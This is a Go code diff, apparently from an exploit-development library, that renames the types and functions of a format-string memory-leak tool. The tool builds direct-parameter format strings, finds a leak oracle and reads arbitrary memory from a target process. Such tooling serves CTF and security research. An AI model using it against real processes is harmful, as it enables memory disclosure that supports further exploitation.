@@ -8,14 +8,14 @@ import (
 	"strings"
 )
 
-type FormatStringParamLeakerConfig struct {
+type FormatStringDirectParamConfig struct {
 	GetProcessFn func() *Process
 	MaxNumParams int
 	PointerSize  int
 	Verbose      *log.Logger
 }
 
-func (o FormatStringParamLeakerConfig) validate() error {
+func (o FormatStringDirectParamConfig) validate() error {
 	if o.GetProcessFn == nil {
 		return fmt.Errorf("get process function cannot be nil")
 	}
@@ -31,10 +31,10 @@ func (o FormatStringParamLeakerConfig) validate() error {
 	return nil
 }
 
-func SetupFormatStringParamLeakerOrExit(config FormatStringParamLeakerConfig) *FormatStringParamLeaker {
-	f, err := SetupFormatStringParamLeaker(config)
+func LeakUsingFormatStringDirectParamOrExit(config FormatStringDirectParamConfig) *FormatStringMemoryLeaker {
+	f, err := LeakUsingFormatStringDirectParam(config)
 	if err != nil {
-		defaultExitFn(fmt.Errorf("failed to create format string leaker - %w", err))
+		defaultExitFn(fmt.Errorf("failed to create format string param memory leaker - %w", err))
 	}
 	return f
 }
@@ -66,7 +66,7 @@ func (o directParamAccessFormatString) withoutPadding() []byte {
 	return buff.Bytes()
 }
 
-func SetupFormatStringParamLeaker(config FormatStringParamLeakerConfig) (*FormatStringParamLeaker, error) {
+func LeakUsingFormatStringDirectParam(config FormatStringDirectParamConfig) (*FormatStringMemoryLeaker, error) {
 	err := config.validate()
 	if err != nil {
 		return nil, err
@@ -114,7 +114,7 @@ func SetupFormatStringParamLeaker(config FormatStringParamLeakerConfig) (*Format
 			config.Verbose.Printf("iteration %d writing: '%s'...", i, str)
 		}
 
-		addressFromFormatFunc, err := getFormatStringLeakedData(
+		addressFromFormatFunc, err := leakDataWithFormatString(
 			config.GetProcessFn(),
 			str,
 			formatStringConfig.info)
@@ -135,7 +135,7 @@ func SetupFormatStringParamLeaker(config FormatStringParamLeakerConfig) (*Format
 					fmtStringLen, len(finalPaddedFormatStr))
 			}
 
-			return &FormatStringParamLeaker{
+			return &FormatStringMemoryLeaker{
 				formatStr: finalPaddedFormatStr,
 				info:      formatStringConfig.info,
 			}, nil
@@ -145,12 +145,12 @@ func SetupFormatStringParamLeaker(config FormatStringParamLeakerConfig) (*Format
 	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
 }
 
-type FormatStringParamLeaker struct {
+type FormatStringMemoryLeaker struct {
 	formatStr []byte
 	info      formatStringInfo
 }
 
-func (o FormatStringParamLeaker) MemoryAtOrExit(pointer Pointer, process *Process) []byte {
+func (o FormatStringMemoryLeaker) MemoryAtOrExit(pointer Pointer, process *Process) []byte {
 	p, err := o.MemoryAt(pointer, process)
 	if err != nil {
 		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
@@ -158,19 +158,19 @@ func (o FormatStringParamLeaker) MemoryAtOrExit(pointer Pointer, process *Proces
 	return p
 }
 
-func (o FormatStringParamLeaker) MemoryAt(pointer Pointer, process *Process) ([]byte, error) {
-	return getFormatStringLeakedData(process, append(o.formatStr, pointer...), o.info)
+func (o FormatStringMemoryLeaker) MemoryAt(pointer Pointer, process *Process) ([]byte, error) {
+	return leakDataWithFormatString(process, append(o.formatStr, pointer...), o.info)
 }
 
-func getFormatStringLeakedData(process *Process, formatStr []byte, info formatStringInfo) ([]byte, error) {
+func leakDataWithFormatString(process *Process, formatStr []byte, info formatStringInfo) ([]byte, error) {
 	err := process.WriteLine(formatStr)
 	if err != nil {
-		return nil, fmt.Errorf("failed to write format string data - %w", err)
+		return nil, fmt.Errorf("failed to write format string to process - %w", err)
 	}
 
 	token, err := process.ReadUntil(info.endOfStringDelim)
 	if err != nil {
-		return nil, fmt.Errorf("failed to read next token from process - %w", err)
+		return nil, fmt.Errorf("failed to format string end of string delim from process - %w", err)
 	}
 
 	firstSepIndex := bytes.Index(token, info.leakedDataSep)
